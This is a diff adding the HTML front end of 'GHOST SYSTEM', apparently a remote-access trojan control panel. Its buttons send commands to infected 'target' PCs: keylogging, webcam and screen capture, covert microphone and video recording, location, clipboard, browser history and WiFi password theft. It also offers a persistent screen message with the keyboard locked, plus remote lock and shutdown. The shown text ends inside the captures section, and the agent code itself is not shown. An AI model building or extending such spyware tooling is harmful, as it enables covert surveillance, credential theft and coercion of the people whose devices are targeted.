@@ -1,0 +1,2053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GHOST • ULTIMATE MONITORING SYSTEM v1.0</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0b0e; color: #00ff9d; font-family: 'Share Tech Mono', monospace; min-height: 100vh; overflow-x: hidden; }
+        #cyber-grid {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
+            background-size: 50px 50px; z-index: -1; animation: gridMove 20s linear infinite;
+        }
+        @keyframes gridMove { 0%{transform:translate(0,0)} 100%{transform:translate(50px,50px)} }
+        .app-container { max-width: 1600px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
+        .cyber-header {
+            background: rgba(0,20,10,0.9); border: 2px solid #00ff9d; border-radius: 10px;
+            padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0,255,157,0.2);
+        }
+        .header-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
+        .logo-area { display: flex; align-items: center; gap: 15px; }
+        .glitch-text { font-size: 2rem; font-weight: bold; color: #00ff9d; text-shadow: 2px 2px 0 #ff00aa; }
+        .status-badge {
+            padding: 10px 20px; background: rgba(0,255,157,0.1); border: 1px solid #00ff9d;
+            border-radius: 5px; display: flex; align-items: center; gap: 10px;
+        }
+        .pulse { width: 12px; height: 12px; background: #00ff9d; border-radius: 50%; animation: pulse 1.5s ease infinite; }
+        @keyframes pulse { 0%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(1.5)} 100%{opacity:1;transform:scale(1)} }
+        .device-panel {
+            background: rgba(0,20,10,0.95); border: 2px solid #00ff9d; border-radius: 10px;
+            padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px);
+        }
+        .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px,1fr)); gap: 15px; margin-top: 15px; max-height: 400px; overflow-y: auto; padding: 5px; }
+        .device-card { background: rgba(0,0,0,0.8); border: 1px solid #00ff9d; border-radius: 8px; padding: 15px; cursor: pointer; transition: all 0.3s; }
+        .device-card:hover { transform: translateY(-5px); box-shadow: 0 0 30px rgba(0,255,157,0.3); }
+        .device-card.selected { border: 2px solid #ff00aa; box-shadow: 0 0 30px rgba(255,0,170,0.3); }
+        .device-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .device-avatar { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #00ff9d; object-fit: cover; }
+        .device-status { width: 12px; height: 12px; border-radius: 50%; background: #00ff9d; animation: pulse 1.5s ease infinite; }
+        .device-status.offline { background: #ff0055; animation: none; }
+        .device-info { font-size: 0.8rem; color: #888; margin-top: 5px; }
+        .offline-badge { background: #ffaa00; color: #000; padding: 2px 5px; border-radius: 3px; font-size: 0.7rem; margin-left: 5px; }
+        .dashboard { display: grid; grid-template-columns: 1fr 500px; gap: 20px; }
+        .terminal-container {
+            background: #000; border: 2px solid #00ff9d; border-radius: 10px;
+            overflow: hidden; display: flex; flex-direction: column; height: 600px;
+        }
+        .terminal-header {
+            background: rgba(0,255,157,0.1); padding: 10px 15px; border-bottom: 1px solid #00ff9d;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .terminal-title { display: flex; align-items: center; gap: 8px; }
+        .terminal-controls { display: flex; gap: 10px; }
+        .terminal-control { width: 20px; height: 20px; border-radius: 3px; background: #00ff9d; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #000; }
+        .terminal-control.clear { background: #ffaa00; }
+        .terminal-control.download { background: #00ccff; }
+        .terminal-body { flex: 1; overflow-y: auto; padding: 15px; font-family: 'Share Tech Mono', monospace; background: #000; }
+        .terminal-line { margin: 8px 0; padding: 5px; border-bottom: 1px solid rgba(0,255,157,0.1); word-wrap: break-word; }
+        .terminal-time { color: #888; margin-right: 10px; font-size: 0.8rem; }
+        .terminal-prompt { color: #ff00aa; font-weight: bold; margin-right: 5px; }
+        .terminal-command { color: #00ff9d; }
+        .terminal-output { color: #fff; margin-left: 20px; white-space: pre-wrap; font-size: 0.9rem; }
+        .terminal-input-area { display: flex; padding: 10px; background: #111; border-top: 1px solid #00ff9d; }
+        #commandInput { flex: 1; background: #000; border: 1px solid #00ff9d; color: #00ff9d; padding: 10px; font-family: 'Share Tech Mono', monospace; outline: none; }
+        #sendCommand { background: #00ff9d; color: #000; border: none; padding: 10px 20px; margin-left: 10px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
+        #sendCommand:hover { background: #00cc7a; box-shadow: 0 0 20px #00ff9d; }
+        .side-panel { background: rgba(0,20,10,0.95); border: 2px solid #00ff9d; border-radius: 10px; padding: 20px; backdrop-filter: blur(10px); height: 600px; overflow-y: auto; }
+        .panel-section { margin-bottom: 25px; }
+        .panel-title { color: #00ff9d; font-size: 1.1rem; margin-bottom: 15px; border-bottom: 1px solid #00ff9d; padding-bottom: 5px; display: flex; align-items: center; gap: 8px; }
+        .quick-actions { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
+        .action-btn {
+            background: transparent; border: 1px solid #00ff9d; color: #00ff9d; padding: 12px;
+            cursor: pointer; font-family: 'Share Tech Mono', monospace;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: all 0.3s; border-radius: 5px; font-size: 0.9rem;
+        }
+        .action-btn:hover { background: #00ff9d; color: #000; transform: scale(1.05); box-shadow: 0 0 20px #00ff9d; }
+        .action-btn.danger:hover { background: #ff0055; border-color: #ff0055; color: #fff; }
+        .action-btn.success:hover { background: #00cc00; border-color: #00cc00; color: #000; }
+        .action-btn.info:hover { background: #00ccff; border-color: #00ccff; color: #000; }
+        .action-btn.warn { border-color: #ffaa00; color: #ffaa00; }
+        .action-btn.warn:hover { background: #ffaa00; color: #000; }
+        .dual-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .keylog-container { background: rgba(0,0,0,0.5); border: 1px solid #00ff9d; border-radius: 5px; padding: 10px; height: 250px; overflow-y: auto; font-family: 'Share Tech Mono', monospace; white-space: pre-wrap; word-wrap: break-word; font-size: 14px; line-height: 1.5; }
+        .audios-container { background: rgba(0,0,0,0.5); border: 1px solid #00ff9d; border-radius: 5px; padding: 10px; height: 250px; overflow-y: auto; }
+        .keylog-text { color: #00ff9d; }
+        .keylog-line { margin-bottom: 5px; padding: 3px; border-left: 2px solid #00ff9d; padding-left: 8px; }
+        .keylog-time { color: #888; font-size: 11px; margin-right: 8px; }
+        .keylog-special { color: #ffaa00; font-weight: bold; background: rgba(255,170,0,0.1); padding: 2px 5px; border-radius: 3px; }
+        .audio-item { background: rgba(0,255,157,0.1); border: 1px solid #00ff9d; border-radius: 5px; padding: 8px; margin-bottom: 8px; }
+        .audio-info { display: flex; justify-content: space-between; font-size: 0.7rem; margin-bottom: 5px; color: #00ff9d; }
+        .audio-controls { display: flex; gap: 5px; margin-top: 5px; }
+        .audio-btn { background: transparent; border: 1px solid #00ff9d; color: #00ff9d; padding: 5px 10px; cursor: pointer; font-size: 0.7rem; border-radius: 3px; flex: 1; transition: all 0.3s; }
+        .audio-btn:hover { background: #00ff9d; color: #000; }
+        .audio-btn.danger:hover { background: #ff0055; border-color: #ff0055; color: #fff; }
+        .keylog-stats { display: flex; justify-content: space-between; margin-top: 10px; padding: 8px; background: rgba(0,255,157,0.1); border-radius: 5px; font-size: 0.8rem; }
+        .keylog-status { display: flex; align-items: center; gap: 5px; }
+        .status-led { width: 8px; height: 8px; border-radius: 50%; background: #ff0055; }
+        .status-led.active { background: #00ff9d; animation: pulse 1s infinite; }
+        .clear-btn { background: #ffaa00; color: #000; border: none; padding: 5px 10px; cursor: pointer; font-size: 0.8rem; border-radius: 3px; margin-left: 10px; }
+        .clear-btn:hover { background: #ffcc00; }
+        .media-preview { margin-top: 10px; border: 1px solid #00ff9d; border-radius: 5px; overflow: hidden; background: #000; cursor: pointer; }
+        .media-preview img { width: 100%; max-height: 150px; object-fit: cover; }
+        .media-info { display: flex; justify-content: space-between; padding: 5px; background: rgba(0,255,157,0.1); font-size: 0.7rem; color: #00ff9d; }
+        .media-actions { display: flex; gap: 5px; margin-top: 5px; }
+        .media-btn { background: transparent; border: 1px solid #00ff9d; color: #00ff9d; padding: 5px 10px; cursor: pointer; font-size: 0.7rem; border-radius: 3px; flex: 1; transition: all 0.3s; }
+        .media-btn:hover { background: #00ff9d; color: #000; }
+        .media-btn.danger:hover { background: #ff0055; border-color: #ff0055; color: #fff; }
+
+        /* ===== MEDIA OVERLAY ===== */
+        .media-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.97); z-index: 1000; display: none; justify-content: center; align-items: center; flex-direction: column; }
+        .media-overlay.active { display: flex; }
+        .media-full { max-width: 90%; max-height: 80%; border: 3px solid #00ff9d; border-radius: 10px; }
+        .info-full { background: #000; border: 3px solid #00ff9d; border-radius: 10px; padding: 30px; max-width: 90%; max-height: 80%; overflow-y: auto; color: #00ff9d; }
+        .info-section { margin-bottom: 20px; border-bottom: 1px solid #00ff9d; padding-bottom: 10px; }
+        .info-title { color: #ff00aa; font-size: 1.2rem; margin-bottom: 10px; }
+        .info-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
+        .info-item { padding: 8px; background: rgba(0,255,157,0.1); border-radius: 5px; }
+        .info-label { color: #888; font-size: 0.8rem; display: block; margin-bottom: 3px; }
+        .info-value { color: #00ff9d; font-size: 0.9rem; word-wrap: break-word; }
+        .close-overlay { position: absolute; top: 20px; right: 20px; color: #00ff9d; font-size: 2rem; cursor: pointer; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border: 2px solid #00ff9d; border-radius: 50%; }
+        .close-overlay:hover { background: #00ff9d; color: #000; }
+        /* Back button in overlay */
+        .overlay-back { position: absolute; top: 20px; left: 20px; color: #00ff9d; font-size: 1rem; cursor: pointer; padding: 8px 16px; border: 2px solid #00ff9d; border-radius: 5px; display: flex; align-items: center; gap: 8px; transition: all 0.3s; }
+        .overlay-back:hover { background: #00ff9d; color: #000; }
+        /* Nav arrows for screenshots */
+        .overlay-nav { position: absolute; top: 50%; transform: translateY(-50%); color: #00ff9d; font-size: 2rem; cursor: pointer; width: 50px; height: 50px; display: flex; align-items: center; justify-content: center; border: 2px solid #00ff9d; border-radius: 50%; transition: all 0.3s; background: rgba(0,0,0,0.5); }
+        .overlay-nav:hover { background: #00ff9d; color: #000; }
+        .overlay-nav.left { left: 20px; }
+        .overlay-nav.right { right: 70px; }
+        /* Video player */
+        .video-full { max-width: 90%; max-height: 80%; border: 3px solid #00ff41; border-radius: 10px; background: #000; }
+        /* Gallery nav */
+        .gallery-counter { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); color: #888; font-size: 0.9rem; }
+
+        .command-history { margin-top: 10px; max-height: 100px; overflow-y: auto; font-size: 0.8rem; }
+        .command-item { padding: 5px; border-bottom: 1px solid rgba(0,255,157,0.1); cursor: pointer; transition: all 0.3s; }
+        .command-item:hover { background: rgba(0,255,157,0.1); }
+        audio { width: 100%; height: 30px; margin: 5px 0; }
+        audio::-webkit-media-controls-panel { background-color: #000; border: 1px solid #00ff9d; }
+        audio::-webkit-media-controls-play-button { background-color: #00ff9d; border-radius: 50%; }
+        .loading-spinner { text-align: center; padding: 40px; color: #00ff9d; }
+        .loading-spinner i { font-size: 2rem; margin-bottom: 10px; }
+
+        /* ===== PASSWORD LOCK ===== */
+        #lockScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0b0e; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
+        .lock-box { background: rgba(0,20,10,0.95); border: 2px solid #00ff9d; border-radius: 12px; padding: 50px 40px; width: 380px; max-width: 90vw; text-align: center; box-shadow: 0 0 60px rgba(0,255,157,0.3); animation: lockFadeIn 0.5s ease; }
+        @keyframes lockFadeIn { from{opacity:0;transform:scale(0.9)} to{opacity:1;transform:scale(1)} }
+        .lock-icon { font-size: 3rem; color: #00ff9d; margin-bottom: 20px; text-shadow: 0 0 20px #00ff9d; }
+        .lock-title { font-size: 1.5rem; color: #00ff9d; margin-bottom: 5px; text-shadow: 2px 2px 0 #ff00aa; }
+        .lock-subtitle { color: #888; font-size: 0.8rem; margin-bottom: 30px; }
+        .lock-input { width: 100%; background: #000; border: 2px solid #00ff9d; color: #00ff9d; padding: 14px 16px; font-family: 'Share Tech Mono', monospace; font-size: 1rem; border-radius: 6px; outline: none; letter-spacing: 3px; text-align: center; transition: all 0.3s; }
+        .lock-input:focus { box-shadow: 0 0 20px rgba(0,255,157,0.4); border-color: #ff00aa; }
+        .lock-btn { margin-top: 20px; width: 100%; background: #00ff9d; color: #000; border: none; padding: 14px; font-family: 'Share Tech Mono', monospace; font-size: 1rem; font-weight: bold; border-radius: 6px; cursor: pointer; transition: all 0.3s; letter-spacing: 2px; }
+        .lock-btn:hover { background: #00cc7a; box-shadow: 0 0 30px rgba(0,255,157,0.5); }
+        .lock-error { margin-top: 15px; color: #ff0055; font-size: 0.85rem; display: none; animation: shakeError 0.3s ease; }
+        @keyframes shakeError { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-10px)} 75%{transform:translateX(10px)} }
+
+        /* ===== CONFIRM MODAL ===== */
+        #confirmModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 99998; display: none; justify-content: center; align-items: center; }
+        #confirmModal.active { display: flex; }
+        .confirm-box { background: rgba(0,10,5,0.98); border: 2px solid #ff0055; border-radius: 12px; padding: 40px 35px; width: 420px; max-width: 90vw; text-align: center; box-shadow: 0 0 60px rgba(255,0,85,0.4); animation: lockFadeIn 0.3s ease; }
+        .confirm-icon { font-size: 3rem; color: #ff0055; margin-bottom: 15px; }
+        .confirm-title { font-size: 1.3rem; color: #ff0055; margin-bottom: 10px; }
+        .confirm-msg { color: #aaa; font-size: 0.9rem; margin-bottom: 10px; line-height: 1.6; }
+        .confirm-cmd { color: #ffaa00; background: rgba(255,170,0,0.1); border: 1px solid #ffaa00; border-radius: 5px; padding: 8px 16px; display: inline-block; margin-bottom: 25px; font-size: 1rem; }
+        .confirm-btns { display: flex; gap: 15px; }
+        .confirm-yes { flex: 1; background: #ff0055; color: #fff; border: none; padding: 13px; font-family: 'Share Tech Mono', monospace; font-size: 0.95rem; border-radius: 6px; cursor: pointer; transition: all 0.3s; font-weight: bold; }
+        .confirm-yes:hover { background: #cc0044; }
+        .confirm-no { flex: 1; background: transparent; color: #00ff9d; border: 2px solid #00ff9d; padding: 13px; font-family: 'Share Tech Mono', monospace; font-size: 0.95rem; border-radius: 6px; cursor: pointer; transition: all 0.3s; }
+        .confirm-no:hover { background: #00ff9d; color: #000; }
+
+        /* ===== VIDEO ITEM ===== */
+        .video-item { background: rgba(0,255,65,0.08); border: 1px solid #00ff41; border-radius: 5px; padding: 8px; margin-bottom: 8px; }
+        .video-thumb-btn { background: #00ff41; color: #000; border: none; padding: 6px 12px; cursor: pointer; font-size: 0.75rem; border-radius: 3px; margin-top: 5px; font-family: 'Share Tech Mono', monospace; transition: all 0.3s; }
+        .video-thumb-btn:hover { background: #00cc33; }
+
+        @media(max-width:768px) {
+            .dashboard { grid-template-columns: 1fr; }
+            .glitch-text { font-size: 1.5rem; }
+            .device-grid { grid-template-columns: 1fr; }
+            .dual-container { grid-template-columns: 1fr; }
+            .overlay-nav.right { right: 70px; }
+        }
+
+        /* ===== CMD TERMINAL PAGE ===== */
+        #cmdPage{display:none;position:fixed;inset:0;z-index:9000;background:#000;flex-direction:column;font-family:'Share Tech Mono',monospace;}
+        .cmd-topbar{background:#0d0d0d;border-bottom:2px solid #ff00aa;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+        .cmd-back{background:transparent;border:1px solid #00ff9d;color:#00ff9d;padding:6px 14px;border-radius:5px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:0.8rem;display:flex;align-items:center;gap:6px;transition:.2s;}
+        .cmd-back:hover{background:#00ff9d;color:#000;}
+        .cmd-title{color:#ff00aa;font-weight:bold;font-size:1rem;letter-spacing:2px;margin-left:10px;}
+        .cmd-device-lbl{color:#888;font-size:0.75rem;margin-left:8px;}
+        .cmd-toolbar{display:flex;align-items:center;gap:8px;}
+        .cmd-tool-btn{background:transparent;border:1px solid #333;color:#666;padding:5px 10px;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:0.72rem;transition:.2s;}
+        .cmd-tool-btn:hover{border-color:#00ff9d;color:#00ff9d;}
+        .cmd-output{flex:1;overflow-y:auto;background:#000;min-height:0;font-size:0.83rem;line-height:1.75;}
+        .cmd-block{border-bottom:1px solid #0a0a0a;padding:4px 16px;}
+        .cmd-inp-row{display:flex;align-items:baseline;gap:6px;padding:4px 0;}
+        .cmd-ps2{color:#ff00aa;font-weight:bold;}
+        .cmd-inp-txt{color:#00ff9d;font-weight:500;}
+        .cmd-ts{color:#333;font-size:0.7rem;margin-left:auto;}
+        .cmd-stdout{color:#ddd;padding-left:20px;margin-top:2px;white-space:pre-wrap;word-break:break-all;}
+        .cmd-stderr{color:#ff6b6b;padding-left:20px;margin-top:2px;white-space:pre-wrap;font-style:italic;}
+        .cmd-exit{color:#333;padding-left:20px;font-size:0.72rem;margin-top:2px;}
+        .cmd-sys{color:#00aaff;padding:4px 16px;font-size:0.8rem;}
+        .cmd-wait-line{display:flex;align-items:center;gap:8px;color:#444;padding:8px 16px;font-size:0.8rem;}
+        .cmd-sug-bar{background:#0a0a0a;border-top:1px solid #111;padding:6px 16px;display:flex;gap:6px;flex-wrap:wrap;flex-shrink:0;}
+        .cmd-sug{background:#111;border:1px solid #1a1a1a;color:#555;padding:3px 10px;border-radius:4px;font-size:0.7rem;cursor:pointer;transition:.15s;}
+        .cmd-sug:hover{border-color:#00ff9d;color:#00ff9d;}
+        .cmd-inp-bar{background:#0a0a0a;border-top:2px solid #ff00aa;padding:10px 16px;display:flex;align-items:center;gap:10px;flex-shrink:0;}
+        .cmd-ps1{color:#ff00aa;font-weight:bold;white-space:nowrap;font-size:.9rem;}
+        .cmd-inp{flex:1;background:transparent;border:none;color:#00ff9d;font-family:'Share Tech Mono',monospace;font-size:.9rem;outline:none;}
+        .cmd-inp::placeholder{color:#222;}
+        .cmd-run-btn{background:#ff00aa;color:#000;border:none;padding:9px 20px;border-radius:5px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-weight:bold;font-size:.85rem;transition:.15s;}
+        .cmd-run-btn:hover{background:#cc0088;}
+    </style>
+</head>
+<body>
+
+<!-- PASSWORD LOCK -->
+<div id="lockScreen">
+    <div class="lock-box">
+        <div class="lock-icon"><i class="fas fa-shield-alt"></i></div>
+        <div class="lock-title">GHOST • SYSTEM</div>
+        <div class="lock-subtitle">AUTHORIZED ACCESS ONLY — ENTER PASSWORD</div>
+        <input type="password" class="lock-input" id="lockInput" placeholder="••••••••••" maxlength="32"
+               onkeypress="if(event.key==='Enter') checkPassword()">
+        <button class="lock-btn" onclick="checkPassword()"><i class="fas fa-unlock"></i> &nbsp;ACCESS SYSTEM</button>
+        <div class="lock-error" id="lockError"><i class="fas fa-times-circle"></i> &nbsp;ACCESS DENIED — INVALID PASSWORD</div>
+    </div>
+</div>
+
+<!-- CONFIRM MODAL -->
+<div id="confirmModal">
+    <div class="confirm-box">
+        <div class="confirm-icon"><i class="fas fa-exclamation-triangle"></i></div>
+        <div class="confirm-title">⚠ DANGER ZONE — CONFIRM ACTION</div>
+        <div class="confirm-msg">আপনি কি সত্যিই এই command execute করতে চান?<br>This action cannot be undone!</div>
+        <div class="confirm-cmd" id="confirmCmdLabel"></div>
+        <div class="confirm-btns">
+            <button class="confirm-yes" id="confirmYesBtn"><i class="fas fa-check"></i> &nbsp;CONFIRM</button>
+            <button class="confirm-no" onclick="closeConfirm()"><i class="fas fa-times"></i> &nbsp;CANCEL</button>
+        </div>
+    </div>
+</div>
+
+<div id="cyber-grid"></div>
+
+<div class="app-container">
+    <!-- Header -->
+    <div class="cyber-header">
+        <div class="header-content">
+            <div class="logo-area">
+                <i class="fas fa-skull" style="font-size:2.5rem;color:#00ff9d;"></i>
+                <h1 class="glitch-text">GHOST SYSTEM v9.0</h1>
+            </div>
+            <div class="status-badge">
+                <div class="pulse"></div>
+                <span id="connectionStatus">CONNECTED</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Device Panel -->
+    <div class="device-panel">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+            <h3><i class="fas fa-network-wired"></i> ACTIVE NODES</h3>
+            <span id="onlineCount">0 ONLINE</span>
+        </div>
+        <div class="device-grid" id="deviceGrid">
+            <div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i><p>SCANNING NETWORK...</p></div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div class="dashboard">
+        <!-- Terminal -->
+        <div class="terminal-container">
+            <div class="terminal-header">
+                <div class="terminal-title"><i class="fas fa-terminal"></i><span>REMOTE_TERMINAL</span></div>
+                <div class="terminal-controls">
+                    <div class="terminal-control" onclick="openCmdPage()" title="CMD Terminal" style="background:#ff00aa;color:#000;width:auto;padding:0 8px;font-size:11px;font-weight:bold;">&#9889;CMD</div>
+                    <div class="terminal-control clear" onclick="clearTerminal()" title="Clear Terminal"><i class="fas fa-eraser"></i></div>
+                    <div class="terminal-control download" onclick="downloadTerminal()" title="Download Log"><i class="fas fa-download"></i></div>
+                </div>
+            </div>
+            <div class="terminal-body" id="terminalBody">
+                <div class="terminal-line">
+                    <span class="terminal-time">[SYSTEM]</span>
+                    <span class="terminal-prompt">#></span>
+                    <span class="terminal-command">GHOST v9.0 initialized</span>
+                </div>
+                <div class="terminal-line">
+                    <span class="terminal-time">[SYSTEM]</span>
+                    <span class="terminal-prompt">#></span>
+                    <span class="terminal-command">Select a device to begin...</span>
+                </div>
+            </div>
+            <div class="terminal-input-area">
+                <input type="text" id="commandInput" placeholder="Enter command (e.g., /fullinfo, /keylog on, /mic 15, /video 10)" disabled>
+                <button id="sendCommand" disabled><i class="fas fa-bolt"></i> EXEC</button>
+            </div>
+        </div>
+
+        <!-- Side Panel -->
+        <div class="side-panel">
+            <!-- Selected Device Info -->
+            <div class="panel-section" id="selectedDeviceInfo">
+                <div class="panel-title"><i class="fas fa-desktop"></i> TARGET</div>
+                <div style="text-align:center;color:#666;">
+                    <i class="fas fa-ban" style="font-size:2rem;"></i>
+                    <p>No device selected</p>
+                </div>
+            </div>
+
+            <!-- Quick Actions -->
+            <div class="panel-section">
+                <div class="panel-title"><i class="fas fa-bolt"></i> QUICK ACTIONS</div>
+                <div class="quick-actions">
+                    <button class="action-btn info" onclick="sendQuickCommand('/fullinfo')"><i class="fas fa-server"></i> FULL INFO</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/screenshot')"><i class="fas fa-camera"></i> SCREENSHOT</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/webcam')"><i class="fas fa-video"></i> WEBCAM</button>
+                    <button class="action-btn warn" onclick="promptVideoRecord()"><i class="fas fa-film"></i> RECORD VIDEO</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/mic 10')"><i class="fas fa-microphone"></i> MIC 10s</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/mic 30')"><i class="fas fa-microphone-alt"></i> MIC 30s</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/location')"><i class="fas fa-map-marker-alt"></i> LOCATION</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/wifi')"><i class="fas fa-wifi"></i> WIFI</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/apps')"><i class="fas fa-window-restore"></i> ACTIVE APPS</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/clipboard')"><i class="fas fa-clipboard"></i> CLIPBOARD</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/browser_history')"><i class="fas fa-history"></i> BROWSER</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/drives')"><i class="fas fa-hdd"></i> DRIVES</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/syslog')"><i class="fas fa-list-alt"></i> SYSLOG</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/installed')"><i class="fas fa-box"></i> INSTALLED</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/startup')"><i class="fas fa-rocket"></i> STARTUP</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/wifipass')"><i class="fas fa-key"></i> WIFI PASS</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/recent')"><i class="fas fa-folder-open"></i> RECENT FILES</button>
+                    <button class="action-btn" onclick="promptOpenTarget()"><i class="fas fa-external-link-alt"></i> OPEN URL/APP</button>
+                    <button class="action-btn" onclick="promptSetClip()"><i class="fas fa-paste"></i> SET CLIPBOARD</button>
+                    <button class="action-btn" onclick="promptWallpaper()"><i class="fas fa-image"></i> WALLPAPER</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/help')"><i class="fas fa-question-circle"></i> HELP</button>
+                </div>
+            </div>
+
+            <!-- Screen Broadcast -->
+            <div class="panel-section">
+                <div class="panel-title">
+                    <i class="fas fa-tv" style="color:#00ff9d"></i> SCREEN BROADCAST
+                    <span id="displayStatusBadge" style="margin-left:auto;font-size:0.7rem;padding:2px 8px;border-radius:10px;background:#1a0000;color:#ff0055;border:1px solid #ff0055;">● INACTIVE</span>
+                </div>
+                <div id="displayActiveBar" style="display:none;background:rgba(0,255,65,0.08);border:1px solid #00ff41;border-radius:5px;padding:8px 12px;margin-bottom:8px;font-size:0.82rem;color:#00ff41;word-break:break-word;">
+                    <span style="color:#888;">SHOWING: </span><span id="displayActiveText"></span>
+                </div>
+                <div style="display:flex;flex-direction:column;gap:8px;">
+                    <textarea id="displayTextInput" placeholder="Type text to show on target PC screen permanently..."
+                        style="background:#000;border:1px solid #00ff9d;color:#00ff9d;padding:10px;font-family:'Share Tech Mono',monospace;font-size:0.9rem;resize:vertical;min-height:80px;outline:none;border-radius:4px;width:100%;"></textarea>
+                    <div style="display:flex;gap:8px;">
+                        <button class="action-btn" style="flex:3;" onclick="sendDisplayText()"><i class="fas fa-broadcast-tower"></i> BROADCAST TO SCREEN</button>
+                        <button class="action-btn danger" style="flex:1;" onclick="clearDisplayText()"><i class="fas fa-times"></i> CLEAR</button>
+                    </div>
+                    <div style="font-size:0.75rem;color:#556655;text-align:center;">Text stays on screen & keyboard locked until you press CLEAR — survives restart</div>
+                </div>
+            </div>
+
+            <!-- Keyboard Tracking -->
+            <div class="panel-section">
+                <div class="panel-title">
+                    <i class="fas fa-keyboard"></i> KEYBOARD TRACKING
+                    <button class="clear-btn" onclick="clearKeylogs()">CLEAR</button>
+                </div>
+                <div class="quick-actions">
+                    <button class="action-btn success" onclick="sendQuickCommand('/keylog on')"><i class="fas fa-play"></i> START</button>
+                    <button class="action-btn danger" onclick="sendQuickCommand('/keylog off')"><i class="fas fa-stop"></i> STOP</button>
+                    <button class="action-btn" onclick="sendQuickCommand('/keylogs')"><i class="fas fa-sync-alt"></i> REFRESH</button>
+                </div>
+                <div class="keylog-stats">
+                    <div class="keylog-status">
+                        <span class="status-led" id="keylogStatusLed"></span>
+                        <span id="keylogStatusText">Disabled</span>
+                    </div>
+                    <div><span id="keylogCount">0</span> keys</div>
+                </div>
+            </div>
+
+            <!-- Dual: Keys + Audios -->
+            <div class="dual-container">
+                <div>
+                    <div class="panel-title" style="font-size:0.9rem;"><i class="fas fa-keyboard"></i> LIVE KEYS</div>
+                    <div class="keylog-container" id="keylogContainer">
+                        <p style="color:#666;text-align:center;">No key data yet</p>
+                    </div>
+                </div>
+                <div>
+                    <div class="panel-title" style="font-size:0.9rem;"><i class="fas fa-music"></i> RECORDED AUDIOS</div>
+                    <div class="audios-container" id="audiosContainer">
+                        <p style="color:#666;text-align:center;">No audio recordings</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Video Recordings -->
+            <div class="panel-section">
+                <div class="panel-title"><i class="fas fa-film" style="color:#00ff41"></i> VIDEO RECORDINGS</div>
+                <div class="audios-container" id="videosContainer" style="height:200px;">
+                    <p style="color:#666;text-align:center;">No video recordings</p>
+                </div>
+            </div>
+
+            <!-- Danger Zone -->
+            <div class="panel-section">
+                <div class="panel-title"><i class="fas fa-exclamation-triangle" style="color:#ff0055;"></i> DANGER ZONE</div>
+                <div class="quick-actions">
+                    <button class="action-btn danger" onclick="confirmDanger('/lock')"><i class="fas fa-lock"></i> LOCK</button>
+                    <button class="action-btn danger" onclick="confirmDanger('/logout')"><i class="fas fa-sign-out-alt"></i> LOGOUT</button>
+                    <button class="action-btn danger" onclick="confirmDanger('/restart')"><i class="fas fa-sync-alt"></i> RESTART</button>
+                    <button class="action-btn danger" onclick="confirmDanger('/shutdown')"><i class="fas fa-power-off"></i> SHUTDOWN</button>
+                </div>
+            </div>
+
+            <!-- Latest Captures -->
+            <div class="panel-section">
+                <div class="panel-title"><i class="fas fa-image"></i> LATEST CAPTURES</div>
+                <!-- Screenshot -->
